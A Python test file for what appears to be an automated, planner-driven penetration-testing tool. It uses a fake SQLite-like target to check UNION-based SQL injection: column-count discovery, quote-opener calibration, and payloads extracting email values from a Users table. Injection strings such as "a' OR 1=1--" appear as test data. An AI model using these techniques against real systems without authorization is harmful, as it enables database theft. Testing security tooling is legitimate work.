"""The UNION capability must measure the column count, not accept a guess.

Measured defect this locks: the planner guessed 9 columns against a 10-column query, so
the escalation produced a column-count error and no impact. These tests drive the evidence
layer with a fake target that answers the way SQLite does, so the discovery, opener
calibration, and extraction contract are all asserted without a network.
"""
import sys
import urllib.parse

sys.path.insert(0, '/root/projects/adaptix')

from src.adaptix.evidence import union_extract as U

COLUMNS = 10


def fake_fetch(url):
    """Answer like the measured target: only the balanced opener executes."""
    query = urllib.parse.unquote(url.split('q=', 1)[1])
    if 'OR 1=1' in query:
        return 200, '{"data": [{"id": 1}, {"id": 2}]}' if "a'))" in query else '{"error": "syntax"}'
    if 'AND 1=2' in query:
        return 200, '{"data": []}' if "a'))" in query else '{"error": "syntax"}'
    if 'UNION SELECT' in query:
        body = query.split('UNION SELECT ', 1)[1]
        fillers = body.split('--')[0].split(' FROM ')[0].split(',')
        if len(fillers) != COLUMNS:
            return 200, '{"error": "SELECTs do not have the same number of result columns"}'
        return 200, '{"data": [{"id": 1, "name": "2", "deletedAt": "leaked@x"}]}'
    return 200, '{"data": [{"id": 1}]}'


def test_discovery_finds_the_real_column_count():
    result = U.discover_columns(fake_fetch, 'http://h/search', 'q', "a' OR 1=1--")
    assert result['columns'] == COLUMNS, result['attempts']
    assert result['opener'] == "a'))", 'the opener must be calibrated, not inherited'


def test_opener_calibration_rejects_the_syntax_error_stem():
    opener, tried = U._calibrate_opener(fake_fetch, 'http://h/search', 'q', "a' OR 1=1--")
    assert opener == "a'))"
    stems = [row['opener'] for row in tried]
    assert "a'" in stems and stems[-1] == "a'))", stems


def test_extraction_filters_nulls_and_sorts_so_the_value_survives_truncation():
    discovery = {'columns': 10, 'opener': "a'))"}
    payload = U.extraction_payload(discovery, 'email', 'Users')
    assert payload.endswith('--')
    assert 'FROM Users' in payload
    assert 'IS NOT NULL ORDER BY email DESC' in payload
    assert payload.count(',') >= COLUMNS - 1


def test_salvage_reads_rows_from_a_truncated_excerpt():
    cut = '{"status": "success", "data": [{"id": 1, "deletedAt": "a@x"}, {"id": 2, "del'
    rows = U._salvage_rows(cut)
    assert rows and rows[0]['deletedAt'] == 'a@x'


def test_probe_and_confirm_reuses_a_measured_discovery():
    calls = []

    def counted(url):
        calls.append(url)
        return fake_fetch(url)

    discovery = U.discover_columns(counted, 'http://h/search', 'q', "a' OR 1=1--")
    before = len(calls)
    outcome = U.probe_and_confirm(counted, 'http://h/search', 'q', prior_payload="a' OR 1=1--",
                                 expression='email', table='Users',
                                 baseline_text='', discovery=discovery)
    assert len(calls) - before == 1, 'a measured discovery must not be re-derived'
    assert outcome['extraction']['status'] == 200
    assert outcome['extraction']['values'], outcome['extraction']


def test_state_integers_tolerate_none():
    """A None in the state used to raise TypeError deep inside the tool.

    Measured: `int(state.get('raw_bytes', 0))` raises when the key exists with an
    explicit None, and the graph's `except` reported only "Tool failed: TypeError".
    """
    from src.adaptix.tools.union_extract import _as_int
    assert _as_int(None) == 0
    assert _as_int('12') == 12
    assert _as_int('', 7) == 7
    assert _as_int(object(), 3) == 3


def test_null_accumulators_do_not_break_the_adapter_contract():
    """A None accumulator must read as empty, not raise.

    Measured: `list(state.get('probe_traces', []))` in the HTTP adapter raised
    "TypeError: 'NoneType' object is not iterable at web.py:629" three times in a live
    run, and the graph could only report "Tool failed: TypeError".
    """
    from src.adaptix.tools import web
    state = {'probe_traces': None, 'request_audit': None}
    assert list(state.get('probe_traces') or []) == []
    assert list(state.get('request_audit') or []) == []
    # The adapter must not iterate the raw value.
    import inspect
    source = inspect.getsource(web)
    assert "list(state.get('probe_traces') or [])" in source


def test_a_repeated_call_does_not_duplicate_the_finding():
    """Evidence identity is (target, parameter, payload), so re-proving is not a new fact.

    Measured: a live run recorded the same UNION extraction four times and the planner
    saw four separate findings.
    """
    import inspect
    from src.adaptix.tools import union_extract as tool
    source = inspect.getsource(tool.union_extract)
    assert 'already' in source and 'identity' in source
